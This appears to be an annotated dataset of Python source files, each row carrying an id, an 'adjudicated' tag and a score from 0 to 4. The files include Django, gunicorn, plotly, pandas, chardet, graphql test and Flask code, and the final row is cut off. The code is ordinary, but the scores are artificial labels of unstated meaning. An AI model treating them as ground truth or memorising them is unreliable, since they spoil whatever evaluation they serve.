257	adjudicated	0	"import json
import openpyxl
from configparser import ConfigParser
from core.infrastructure.constants.data import PROJECT_PATH, CONFIG_PATH


def read_config(key: str, value: str) -> str:
    config = ConfigParser()
    config.read(CONFIG_PATH)
    return config.get(key, value)


def read_json(path: str) -> dict:
    with open(path, 'r', encoding='utf-8') as json_file:
        file = json.load(json_file)
        return file


def write_json(path: str, key: str, value: str) -> None:
    data = read_json(path)
    data[key] = value
    with open(path, 'w', encoding='utf-8') as json_file:
        json.dump(data, json_file)


def read_excel(sheet_name: str, value: str) -> dict[str]:
    path = fr""{PROJECT_PATH}\{read_config('path', 'page_base')}""
    workbook = openpyxl.load_workbook(path)
    sheet = workbook[sheet_name]
    cache = {}
    for row in sheet.iter_rows(min_row=2, values_only=True):
        result = {
            'name': row[0],
            'locator': row[1],
            'type': row[2],
            'image': row[3]
        }
        cache[result['name']] = result
    try:
        match cache[value]['name']:
            case _:
                return {
                    'name': cache[value]['name'],
                    'locator': cache[value]['locator'],
                    'type': cache[value]['type'],
                    'image': cache[value]['image']
                }
    except ValueError:
        raise Exception('no such type')


def get_name(*args: str) -> str:
    return read_excel(*args)['name']


def get_locator(*args: str) -> str:
    return read_excel(*args)['locator']


def get_type(*args: str) -> str:
    return read_excel(*args)['type']


def get_image(*args: str) -> str:
    return read_excel(*args)['image']"
75	adjudicated	3	"import cx_Oracle

from django.db.backends.oracle.introspection import DatabaseIntrospection
from django.utils.functional import cached_property


class OracleIntrospection(DatabaseIntrospection):
    # Associating any OBJECTVAR instances with GeometryField. This won't work
    # right on Oracle objects that aren't MDSYS.SDO_GEOMETRY, but it is the
    # only object type supported within Django anyways.
    @cached_property
    def data_types_reverse(self):
        return {
            **super().data_types_reverse,
            cx_Oracle.OBJECT: ""GeometryField"",
        }

    def get_geometry_type(self, table_name, description):
        with self.connection.cursor() as cursor:
            # Querying USER_SDO_GEOM_METADATA to get the SRID and dimension information.
            try:
                cursor.execute(
                    'SELECT ""DIMINFO"", ""SRID"" FROM ""USER_SDO_GEOM_METADATA"" '
                    'WHERE ""TABLE_NAME""=%s AND ""COLUMN_NAME""=%s',
                    (table_name.upper(), description.name.upper()),
                )
                row = cursor.fetchone()
            except Exception as exc:
                raise Exception(
                    ""Could not find entry in USER_SDO_GEOM_METADATA ""
                    'corresponding to ""%s"".""%s""' % (table_name, description.name)
                ) from exc

            # TODO: Research way to find a more specific geometry field type for
            # the column's contents.
            field_type = ""GeometryField""

            # Getting the field parameters.
            field_params = {}
            dim, srid = row
            if srid != 4326:
                field_params[""srid""] = srid
            # Size of object array (SDO_DIM_ARRAY) is number of dimensions.
            dim = dim.size()
            if dim != 2:
                field_params[""dim""] = dim
        return field_type, field_params"
135	adjudicated	1	"# Copyright 2023 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from datetime import datetime
import os

from flask import Flask, request

from weather.data import get_inputs_patch
from weather.model import WeatherModel

app = Flask(__name__)

MODEL = WeatherModel.from_pretrained(""model"")


def to_bool(x: str) -> bool:
    return x.lower() == ""true""


@app.route(""/"")
def ping() -> dict:
    """"""Checks that we can communicate with the service and get arguments.""""""
    return {
        ""response"": ""â I got your request!"",
        ""args"": request.args,
    }


@app.route(""/predict/<iso_date>/<float(signed=True):lat>,<float(signed=True):lon>"")
def predict(iso_date: str, lat: float, lon: float) -> dict:
    # Optional HTTP request parameters.
    #   https://en.wikipedia.org/wiki/Query_string
    patch_size = request.args.get(""patch-size"", 128, type=int)
    include_inputs = request.args.get(""include-inputs"", False, type=to_bool)

    date = datetime.fromisoformat(iso_date)
    inputs = get_inputs_patch(date, (lon, lat), patch_size).tolist()
    predictions = MODEL.predict(inputs).tolist()

    if include_inputs:
        return {""inputs"": inputs, ""predictions"": predictions}
    return {""predictions"": predictions}


if __name__ == ""__main__"":
    app.run(debug=True, host=""0.0.0.0"", port=int(os.environ.get(""PORT"", 8080)))"
24	adjudicated	2	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""splom"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
164	adjudicated	1	"# -*- coding: utf-8 -
#
# This file is part of gunicorn released under the MIT license.
# See the NOTICE for more information.

import configparser
import os

from paste.deploy import loadapp

from gunicorn.app.wsgiapp import WSGIApplication
from gunicorn.config import get_default_config_file


def get_wsgi_app(config_uri, name=None, defaults=None):
    if ':' not in config_uri:
        config_uri = ""config:%s"" % config_uri

    return loadapp(
        config_uri,
        name=name,
        relative_to=os.getcwd(),
        global_conf=defaults,
    )


def has_logging_config(config_file):
    parser = configparser.ConfigParser()
    parser.read([config_file])
    return parser.has_section('loggers')


def serve(app, global_conf, **local_conf):
    """"""\
    A Paste Deployment server runner.

    Example configuration:

        [server:main]
        use = egg:gunicorn#main
        host = 127.0.0.1
        port = 5000
    """"""
    config_file = global_conf['__file__']
    gunicorn_config_file = local_conf.pop('config', None)

    host = local_conf.pop('host', '')
    port = local_conf.pop('port', '')
    if host and port:
        local_conf['bind'] = '%s:%s' % (host, port)
    elif host:
        local_conf['bind'] = host.split(',')

    class PasterServerApplication(WSGIApplication):
        def load_config(self):
            self.cfg.set(""default_proc_name"", config_file)

            if has_logging_config(config_file):
                self.cfg.set(""logconfig"", config_file)

            if gunicorn_config_file:
                self.load_config_from_file(gunicorn_config_file)
            else:
                default_gunicorn_config_file = get_default_config_file()
                if default_gunicorn_config_file is not None:
                    self.load_config_from_file(default_gunicorn_config_file)

            for k, v in local_conf.items():
                if v is not None:
                    self.cfg.set(k.lower(), v)

        def load(self):
            return app

    PasterServerApplication().run()"
263	adjudicated	0	"from graphql.language.location import SourceLocation
from graphql.validation.rules import LoneAnonymousOperation

from .utils import expect_fails_rule, expect_passes_rule


def anon_not_alone(line, column):
    return {
        ""message"": LoneAnonymousOperation.anonymous_operation_not_alone_message(),
        ""locations"": [SourceLocation(line, column)],
    }


def test_no_operations():
    expect_passes_rule(
        LoneAnonymousOperation,
        """"""
      fragment fragA on Type {
        field
      }
    """""",
    )


def test_one_anon_operation():
    expect_passes_rule(
        LoneAnonymousOperation,
        """"""
      {
        field
      }
    """""",
    )


def test_multiple_named_operation():
    expect_passes_rule(
        LoneAnonymousOperation,
        """"""
      query Foo {
        field
      }

      query Bar {
        field
      }
    """""",
    )


def test_anon_operation_with_fragment():
    expect_passes_rule(
        LoneAnonymousOperation,
        """"""
      {
        ...Foo
      }
      fragment Foo on Type {
        field
      }
    """""",
    )


def test_multiple_anon_operations():
    expect_fails_rule(
        LoneAnonymousOperation,
        """"""
      {
        fieldA
      }
      {
        fieldB
      }
    """""",
        [anon_not_alone(2, 7), anon_not_alone(5, 7)],
    )


def test_anon_operation_with_a_mutation():
    expect_fails_rule(
        LoneAnonymousOperation,
        """"""
      {
        fieldA
      }
      mutation Foo {
        fieldB
      }
    """""",
        [anon_not_alone(2, 7)],
    )


def test_anon_operation_with_a_subscription():
    expect_fails_rule(
        LoneAnonymousOperation,
        """"""
      {
        fieldA
      }
      subscription Foo {
        fieldB
      }
    """""",
        [anon_not_alone(2, 7)],
    )"
323	adjudicated	4	"# -*- coding: utf-8 -*-
""""""
Charset-Normalizer
~~~~~~~~~~~~~~
The Real First Universal Charset Detector.
A library that helps you read text from an unknown charset encoding.
Motivated by chardet, This package is trying to resolve the issue by taking a new approach.
All IANA character set names for which the Python core library provides codecs are supported.

Basic usage:
   >>> from charset_normalizer import from_bytes
   >>> results = from_bytes('BÑÐµÐºÐ¸ ÑÐ¾Ð²ÐµÐº Ð¸Ð¼Ð° Ð¿ÑÐ°Ð²Ð¾ Ð½Ð° Ð¾Ð±ÑÐ°Ð·Ð¾Ð²Ð°Ð½Ð¸Ðµ. OÐ±ÑÐ°Ð·Ð¾Ð²Ð°Ð½Ð¸ÐµÑÐ¾!'.encode('utf_8'))
   >>> best_guess = results.best()
   >>> str(best_guess)
   'BÑÐµÐºÐ¸ ÑÐ¾Ð²ÐµÐº Ð¸Ð¼Ð° Ð¿ÑÐ°Ð²Ð¾ Ð½Ð° Ð¾Ð±ÑÐ°Ð·Ð¾Ð²Ð°Ð½Ð¸Ðµ. OÐ±ÑÐ°Ð·Ð¾Ð²Ð°Ð½Ð¸ÐµÑÐ¾!'

Others methods and usages are available - see the full documentation
at <https://github.com/Ousret/charset_normalizer>.
:copyright: (c) 2021 by Ahmed TAHRI
:license: MIT, see LICENSE for more details.
""""""
import logging

from .api import from_bytes, from_fp, from_path, normalize
from .legacy import (
    CharsetDetector,
    CharsetDoctor,
    CharsetNormalizerMatch,
    CharsetNormalizerMatches,
    detect,
)
from .models import CharsetMatch, CharsetMatches
from .utils import set_logging_handler
from .version import VERSION, __version__

__all__ = (
    ""from_fp"",
    ""from_path"",
    ""from_bytes"",
    ""normalize"",
    ""detect"",
    ""CharsetMatch"",
    ""CharsetMatches"",
    ""CharsetNormalizerMatch"",
    ""CharsetNormalizerMatches"",
    ""CharsetDetector"",
    ""CharsetDoctor"",
    ""__version__"",
    ""VERSION"",
    ""set_logging_handler"",
)

# Attach a NullHandler to the top level logger by default
# https://docs.python.org/3.3/howto/logging.html#configuring-logging-for-a-library

logging.getLogger(""charset_normalizer"").addHandler(logging.NullHandler())"
232	adjudicated	2	"from _pydev_bundle._pydev_saved_modules import socket
import sys

IS_JYTHON = sys.platform.find('java') != -1

_cache = None


def get_localhost():
    '''
    Should return 127.0.0.1 in ipv4 and ::1 in ipv6

    localhost is not used because on windows vista/windows 7, there can be issues where the resolving doesn't work
    properly and takes a lot of time (had this issue on the pyunit server).

    Using the IP directly solves the problem.
    '''
    # TODO: Needs better investigation!

    global _cache
    if _cache is None:
        try:
            for addr_info in socket.getaddrinfo(""localhost"", 80, 0, 0, socket.SOL_TCP):
                config = addr_info[4]
                if config[0] == '127.0.0.1':
                    _cache = '127.0.0.1'
                    return _cache
        except:
            # Ok, some versions of Python don't have getaddrinfo or SOL_TCP... Just consider it 127.0.0.1 in this case.
            _cache = '127.0.0.1'
        else:
            _cache = 'localhost'

    return _cache


def get_socket_names(n_sockets, close=False):
    socket_names = []
    sockets = []
    for _ in range(n_sockets):
        if IS_JYTHON:
            # Although the option which would be pure java *should* work for Jython, the socket being returned is still 0
            # (i.e.: it doesn't give the local port bound, only the original port, which was 0).
            from java.net import ServerSocket
            sock = ServerSocket(0)
            socket_name = get_localhost(), sock.getLocalPort()
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((get_localhost(), 0))
            socket_name = sock.getsockname()

        sockets.append(sock)
        socket_names.append(socket_name)

    if close:
        for s in sockets:
            s.close()
    return socket_names


def get_socket_name(close=False):
    return get_socket_names(1, close)[0]


if __name__ == '__main__':
    print(get_socket_name())"
372	adjudicated	4	"""""""uestc URL Configuration

The `urlpatterns` list routes URLs to views. For more information please see:
    https://docs.djangoproject.com/en/1.9/topics/http/urls/
Examples:
Function views
    1. Add an import:  from my_app import views
    2. Add a URL to urlpatterns:  url(r'^$', views.home, name='home')
Class-based views
    1. Add an import:  from other_app.views import Home
    2. Add a URL to urlpatterns:  url(r'^$', Home.as_view(), name='home')
Including another URLconf
    1. Import the include() function: from django.conf.urls import url, include
    2. Add a URL to urlpatterns:  url(r'^blog/', include('blog.urls'))
""""""
from django.conf.urls import url
from django.contrib import admin
from subject import views

urlpatterns = [
    url(r'^admin/$', views.admin_login, name='admin_login'),
    url(r'^$', views.login, name='login'),
    url(r'^login/$', views.user_login, name='user_login'),
    url(r'^index/$', views.index, name='index'),
    url(r'^admin/index/$', views.admin_index, name='admin_index'),
    url(r'^course/$', views.get_course, name='get_course'),
    url(r'^log/$', views.get_log, name='get_log'),
    url(r'^choose/$', views.get_already_choose, name='get_already_choose'),
    url(r'^logout/$', views.logout, name='logout'),
    url(r'^select/$', views.select_course, name='select_course'),
    url(r'^cancel/$', views.cancel_course, name='cancel_course'),
    url(r'^admin/get/course/$', views.list_course, name='list_course'),
    url(r'^admin/get/student/$', views.list_student, name='list_student'),
    url(r'^admin/get/teacher/$', views.list_teacher, name='list_teacher'),
    url(r'^admin/delete/course/$', views.delete_course, name='delete_course'),
    url(r'^admin/add/course/$', views.add_course, name='add_course'),
    url(r'^admin/add/student/$', views.add_student, name='add_student'),
    url(r'^admin/resetPassword/$', views.reset_passwd, name='reset_passwd'),
    url(r'^admin/delete/teacher/$', views.delete_teacher, name='delete_teacher'),
    url(r'^admin/add/teacher/$', views.add_teacher, name='add_teacher'),
    url(r'^search/$', views.search, name='search'),
    url(r'^password/$', views.change_passwd, name='change_passwd'),
]"
150	adjudicated	1	"""""""distutils.command.install_scripts

Implements the Distutils 'install_scripts' command, for installing
Python scripts.""""""

# contributed by Bastian Kleineidam

import os
from distutils.core import Command
from distutils import log
from stat import ST_MODE


class install_scripts(Command):

    description = ""install scripts (Python or otherwise)""

    user_options = [
        ('install-dir=', 'd', ""directory to install scripts to""),
        ('build-dir=','b', ""build directory (where to install from)""),
        ('force', 'f', ""force installation (overwrite existing files)""),
        ('skip-build', None, ""skip the build steps""),
    ]

    boolean_options = ['force', 'skip-build']

    def initialize_options(self):
        self.install_dir = None
        self.force = 0
        self.build_dir = None
        self.skip_build = None

    def finalize_options(self):
        self.set_undefined_options('build', ('build_scripts', 'build_dir'))
        self.set_undefined_options('install',
                                   ('install_scripts', 'install_dir'),
                                   ('force', 'force'),
                                   ('skip_build', 'skip_build'),
                                  )

    def run(self):
        if not self.skip_build:
            self.run_command('build_scripts')
        self.outfiles = self.copy_tree(self.build_dir, self.install_dir)
        if os.name == 'posix':
            # Set the executable bits (owner, group, and world) on
            # all the scripts we just installed.
            for file in self.get_outputs():
                if self.dry_run:
                    log.info(""changing mode of %s"", file)
                else:
                    mode = ((os.stat(file)[ST_MODE]) | 0o555) & 0o7777
                    log.info(""changing mode of %s to %o"", file, mode)
                    os.chmod(file, mode)

    def get_inputs(self):
        return self.distribution.scripts or []

    def get_outputs(self):
        return self.outfiles or []"
10	adjudicated	0	"from pandas.core.dtypes.common import (
    is_array_like,
    is_bool,
    is_bool_dtype,
    is_categorical,
    is_categorical_dtype,
    is_complex,
    is_complex_dtype,
    is_datetime64_any_dtype,
    is_datetime64_dtype,
    is_datetime64_ns_dtype,
    is_datetime64tz_dtype,
    is_dict_like,
    is_dtype_equal,
    is_extension_array_dtype,
    is_extension_type,
    is_file_like,
    is_float,
    is_float_dtype,
    is_hashable,
    is_int64_dtype,
    is_integer,
    is_integer_dtype,
    is_interval,
    is_interval_dtype,
    is_iterator,
    is_list_like,
    is_named_tuple,
    is_number,
    is_numeric_dtype,
    is_object_dtype,
    is_period_dtype,
    is_re,
    is_re_compilable,
    is_scalar,
    is_signed_integer_dtype,
    is_sparse,
    is_string_dtype,
    is_timedelta64_dtype,
    is_timedelta64_ns_dtype,
    is_unsigned_integer_dtype,
    pandas_dtype,
)

__all__ = [
    ""is_array_like"",
    ""is_bool"",
    ""is_bool_dtype"",
    ""is_categorical"",
    ""is_categorical_dtype"",
    ""is_complex"",
    ""is_complex_dtype"",
    ""is_datetime64_any_dtype"",
    ""is_datetime64_dtype"",
    ""is_datetime64_ns_dtype"",
    ""is_datetime64tz_dtype"",
    ""is_dict_like"",
    ""is_dtype_equal"",
    ""is_extension_array_dtype"",
    ""is_extension_type"",
    ""is_file_like"",
    ""is_float"",
    ""is_float_dtype"",
    ""is_hashable"",
    ""is_int64_dtype"",
    ""is_integer"",
    ""is_integer_dtype"",
    ""is_interval"",
    ""is_interval_dtype"",
    ""is_iterator"",
    ""is_list_like"",
    ""is_named_tuple"",
    ""is_number"",
    ""is_numeric_dtype"",
    ""is_object_dtype"",
    ""is_period_dtype"",
    ""is_re"",
    ""is_re_compilable"",
    ""is_scalar"",
    ""is_signed_integer_dtype"",
    ""is_sparse"",
    ""is_string_dtype"",
    ""is_timedelta64_dtype"",
    ""is_timedelta64_ns_dtype"",
    ""is_unsigned_integer_dtype"",
    ""pandas_dtype"",
]"
381	adjudicated	2	"""""""
 The GeometryColumns and SpatialRefSys models for the Oracle spatial
 backend.

 It should be noted that Oracle Spatial does not have database tables
 named according to the OGC standard, so the closest analogs are used.
 For example, the `USER_SDO_GEOM_METADATA` is used for the GeometryColumns
 model and the `SDO_COORD_REF_SYS` is used for the SpatialRefSys model.
""""""
from django.contrib.gis.db import models
from django.contrib.gis.db.backends.base.models import SpatialRefSysMixin


class OracleGeometryColumns(models.Model):
    ""Maps to the Oracle USER_SDO_GEOM_METADATA table.""
    table_name = models.CharField(max_length=32)
    column_name = models.CharField(max_length=1024)
    srid = models.IntegerField(primary_key=True)
    # TODO: Add support for `diminfo` column (type MDSYS.SDO_DIM_ARRAY).

    class Meta:
        app_label = ""gis""
        db_table = ""USER_SDO_GEOM_METADATA""
        managed = False

    def __str__(self):
        return ""%s - %s (SRID: %s)"" % (self.table_name, self.column_name, self.srid)

    @classmethod
    def table_name_col(cls):
        """"""
        Return the name of the metadata column used to store the feature table
        name.
        """"""
        return ""table_name""

    @classmethod
    def geom_col_name(cls):
        """"""
        Return the name of the metadata column used to store the feature
        geometry column.
        """"""
        return ""column_name""


class OracleSpatialRefSys(models.Model, SpatialRefSysMixin):
    ""Maps to the Oracle MDSYS.CS_SRS table.""
    cs_name = models.CharField(max_length=68)
    srid = models.IntegerField(primary_key=True)
    auth_srid = models.IntegerField()
    auth_name = models.CharField(max_length=256)
    wktext = models.CharField(max_length=2046)
    # Optional geometry representing the bounds of this coordinate
    # system.  By default, all are NULL in the table.
    cs_bounds = models.PolygonField(null=True)

    class Meta:
        app_label = ""gis""
        db_table = ""CS_SRS""
        managed = False

    @property
    def wkt(self):
        return self.wktext"
101	adjudicated	2	"from django.conf import settings
from django.utils.translation import get_supported_language_variant
from django.utils.translation.trans_real import language_code_re

from . import Error, Tags, register

E001 = Error(
    'You have provided an invalid value for the LANGUAGE_CODE setting: {!r}.',
    id='translation.E001',
)

E002 = Error(
    'You have provided an invalid language code in the LANGUAGES setting: {!r}.',
    id='translation.E002',
)

E003 = Error(
    'You have provided an invalid language code in the LANGUAGES_BIDI setting: {!r}.',
    id='translation.E003',
)

E004 = Error(
    'You have provided a value for the LANGUAGE_CODE setting that is not in '
    'the LANGUAGES setting.',
    id='translation.E004',
)


@register(Tags.translation)
def check_setting_language_code(app_configs, **kwargs):
    """"""Error if LANGUAGE_CODE setting is invalid.""""""
    tag = settings.LANGUAGE_CODE
    if not isinstance(tag, str) or not language_code_re.match(tag):
        return [Error(E001.msg.format(tag), id=E001.id)]
    return []


@register(Tags.translation)
def check_setting_languages(app_configs, **kwargs):
    """"""Error if LANGUAGES setting is invalid.""""""
    return [
        Error(E002.msg.format(tag), id=E002.id)
        for tag, _ in settings.LANGUAGES if not isinstance(tag, str) or not language_code_re.match(tag)
    ]


@register(Tags.translation)
def check_setting_languages_bidi(app_configs, **kwargs):
    """"""Error if LANGUAGES_BIDI setting is invalid.""""""
    return [
        Error(E003.msg.format(tag), id=E003.id)
        for tag in settings.LANGUAGES_BIDI if not isinstance(tag, str) or not language_code_re.match(tag)
    ]


@register(Tags.translation)
def check_language_settings_consistent(app_configs, **kwargs):
    """"""Error if language settings are not consistent with each other.""""""
    try:
        get_supported_language_variant(settings.LANGUAGE_CODE)
    except LookupError:
        return [E004]
    else:
        return []"
290	adjudicated	0	"# Copyright (c) 2020, Oracle and/or its affiliates.
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License, version 2.0, as
# published by the Free Software Foundation.
#
# This program is also distributed with certain software (including
# but not limited to OpenSSL) that is licensed under separate terms,
# as designated in a particular file or component or in included license
# documentation.  The authors of MySQL hereby grant you an
# additional permission to link the program and your derivative works
# with the separately licensed software that they have included with
# MySQL.
#
# Without limiting anything contained in the foregoing, this file,
# which is part of MySQL Connector/Python, is also subject to the
# Universal FOSS Exception, version 1.0, a copy of which can be found at
# http://oss.oracle.com/licenses/universal-foss-exception.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
# See the GNU General Public License, version 2.0, for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin St, Fifth Floor, Boston, MA 02110-1301  USA

from django.db.backends.mysql.schema import DatabaseSchemaEditor as MySQLDatabaseSchemaEditor


class DatabaseSchemaEditor(MySQLDatabaseSchemaEditor):

    def quote_value(self, value):
        self.connection.ensure_connection()
        if isinstance(value, str):
            value = value.replace('%', '%%')
        quoted = self.connection.connection.converter.escape(value)
        if isinstance(value, str) and isinstance(quoted, bytes):
            quoted = quoted.decode()
        return quoted"
41	adjudicated	1	"import glob
import logging
import socket

import debugpy
import pandas as pd
from rdkit import Chem

logger = logging.getLogger(__name__)
logger.addHandler(logging.NullHandler())


def getipaddress():
    return socket.gethostbyname(socket.getfqdn())


def debug():
    logger.info(""Waiting for debugger to connect"")
    if (
        socket.getfqdn().startswith(""dcc"")
        or socket.getfqdn().startswith(""mol"")
        or socket.getfqdn().startswith(""ccc"")
    ):
        debugpy.listen(address=(getipaddress(), 3000))
        debugpy.wait_for_client()
    debugpy.breakpoint()


class ListDataset:
    def __init__(self, seqs):
        self.seqs = seqs

    def __getitem__(self, index):
        return self.seqs[index]

    def __len__(self):
        return len(self.seqs)


def transform_single_embedding_to_multiple(smiles_z_map):
    """"""Transforms an embedding map of the format smi->embedding to
    smi-> {""canonical_embeddings"":embedding}. This function exists
    as a compatibility layer

    Args:
        smiles_z_map ([type]): [description]
    """"""
    retval = dict()
    for key in smiles_z_map:
        retval[key] = {""canonical_embeddings"": smiles_z_map[key]}
    return retval


def normalize_smiles(smi, canonical, isomeric):
    normalized = Chem.MolToSmiles(
        Chem.MolFromSmiles(smi), canonical=canonical, isomericSmiles=isomeric
    )
    return normalized


def get_all_proteins(affinity_dir: str):
    files = glob.glob(affinity_dir + ""/*.csv"")
    all_proteins = []
    logger.info(files)
    for file in files:
        df = pd.read_csv(file)
        all_proteins.extend(df[""protein""].tolist())
    return set(all_proteins)


def append_to_file(filename, line):
    with open(filename, ""a"") as f:
        f.write(line + ""\n"")


def write_to_file(filename, line):
    with open(filename, ""w"") as f:
        f.write(line + ""\n"")"
121	adjudicated	1	"######################## BEGIN LICENSE BLOCK ########################
# The Original Code is mozilla.org code.
#
# The Initial Developer of the Original Code is
# Netscape Communications Corporation.
# Portions created by the Initial Developer are Copyright (C) 1998
# the Initial Developer. All Rights Reserved.
#
# Contributor(s):
#   Mark Pilgrim - port to Python
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
# 02110-1301  USA
######################### END LICENSE BLOCK #########################

from .chardistribution import EUCKRDistributionAnalysis
from .codingstatemachine import CodingStateMachine
from .mbcharsetprober import MultiByteCharSetProber
from .mbcssm import CP949_SM_MODEL


class CP949Prober(MultiByteCharSetProber):
    def __init__(self):
        super().__init__()
        self.coding_sm = CodingStateMachine(CP949_SM_MODEL)
        # NOTE: CP949 is a superset of EUC-KR, so the distribution should be
        #       not different.
        self.distribution_analyzer = EUCKRDistributionAnalysis()
        self.reset()

    @property
    def charset_name(self):
        return ""CP949""

    @property
    def language(self):
        return ""Korean"""
61	adjudicated	0	"# Copyright 2016 Google Inc. All rights reserved.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import mock
from protorpc import message_types

import main


def test_list_greetings(testbed):
    api = main.GreetingApi()
    response = api.list_greetings(message_types.VoidMessage())
    assert len(response.items) == 2


def test_get_greeting(testbed):
    api = main.GreetingApi()
    request = main.GreetingApi.get_greeting.remote.request_type(id=1)
    response = api.get_greeting(request)
    assert response.message == 'goodbye world!'


def test_multiply_greeting(testbed):
    api = main.GreetingApi()
    request = main.GreetingApi.multiply_greeting.remote.request_type(
        times=4,
        message='help I\'m trapped in a test case.')
    response = api.multiply_greeting(request)
    assert response.message == 'help I\'m trapped in a test case.' * 4


def test_authed_greet(testbed):
    api = main.AuthedGreetingApi()

    with mock.patch('main.endpoints.get_current_user') as user_mock:
        user_mock.return_value = None
        response = api.greet(message_types.VoidMessage())
        assert response.message == 'Hello, Anonymous'

        user_mock.return_value = mock.Mock()
        user_mock.return_value.email.return_value = 'user@example.com'
        response = api.greet(message_types.VoidMessage())
        assert response.message == 'Hello, user@example.com'"
170	adjudicated	3	"from django.utils.cache import patch_vary_headers
from django.utils.deprecation import MiddlewareMixin
from django.utils.regex_helper import _lazy_re_compile
from django.utils.text import compress_sequence, compress_string

re_accepts_gzip = _lazy_re_compile(r'\bgzip\b')


class GZipMiddleware(MiddlewareMixin):
    """"""
    Compress content if the browser allows gzip compression.
    Set the Vary header accordingly, so that caches will base their storage
    on the Accept-Encoding header.
    """"""
    def process_response(self, request, response):
        # It's not worth attempting to compress really short responses.
        if not response.streaming and len(response.content) < 200:
            return response

        # Avoid gzipping if we've already got a content-encoding.
        if response.has_header('Content-Encoding'):
            return response

        patch_vary_headers(response, ('Accept-Encoding',))

        ae = request.META.get('HTTP_ACCEPT_ENCODING', '')
        if not re_accepts_gzip.search(ae):
            return response

        if response.streaming:
            # Delete the `Content-Length` header for streaming content, because
            # we won't know the compressed size until we stream it.
            response.streaming_content = compress_sequence(response.streaming_content)
            del response['Content-Length']
        else:
            # Return the compressed content only if it's actually shorter.
            compressed_content = compress_string(response.content)
            if len(compressed_content) >= len(response.content):
                return response
            response.content = compressed_content
            response['Content-Length'] = str(len(response.content))

        # If there is a strong ETag, make it weak to fulfill the requirements
        # of RFC 7232 section-2.1 while also allowing conditional request
        # matches on ETags.
        etag = response.get('ETag')
        if etag and etag.startswith('""'):
            response['ETag'] = 'W/' + etag
        response['Content-Encoding'] = 'gzip'

        return response"
30	adjudicated	2	"from collections import defaultdict, deque


class Solution(object):
    def shortestAlternatingPaths(self, n, redEdges, blueEdges):
        """"""
        :type n: int
        :type redEdges: List[List[int]]
        :type blueEdges: List[List[int]]
        :rtype: List[int]
        """"""
        graph = defaultdict(list)
        red = defaultdict(lambda: False)
        blue = defaultdict(lambda: False)
        visited = defaultdict(lambda: False)
        res = [10**9]*n
        res[0] = 0
        for u, v in redEdges:
            red[(u, v)] = True
            graph[u].append(v)
        for u, v in blueEdges:
            blue[(u, v)] = True
            graph[u].append(v)
        queue = deque()

        # -1: red
        # 0: whatever
        # 1: blue
        # current node, previous edge 's color, maxDistance
        queue.append((0, 0, 0))
        while queue:
            u, c, d = queue.popleft()
            for v in graph[u]:
                if visited[(u, v, c)] == False:
                    if c == 0:  # whatever
                        if red[(u, v)] and blue[(u, v)]:
                            color = 0
                        elif red[(u, v)] and not blue[(u, v)]:
                            color = -1
                        elif not red[(u, v)] and blue[(u, v)]:
                            color = 1
                        queue.append((v, color, d+1))
                        res[v] = min(res[v], d+1)
                        visited[(u, v, c)] = True
                    elif c == -1 and blue[(u, v)]:
                        queue.append((v, 1, d+1))
                        res[v] = min(res[v], d+1)
                        visited[(u, v, c)] = True
                    elif c == 1 and red[(u, v)]:
                        queue.append((v, -1, d+1))
                        res[v] = min(res[v], d+1)
                        visited[(u, v, c)] = True
        for i in range(n):
            if res[i] == 10**9:
                res[i] = -1
        return res


t = Solution()
# t.shortestAlternatingPaths(5, [[0, 1], [1, 2], [2, 3], [3, 4]], [
#                            [1, 2], [2, 3], [3, 1]])
t.shortestAlternatingPaths(3, [[0, 1], [0, 2]], [[1, 0]])"
183	adjudicated	3	"#
# Copyright 2018 the original author or authors.
#
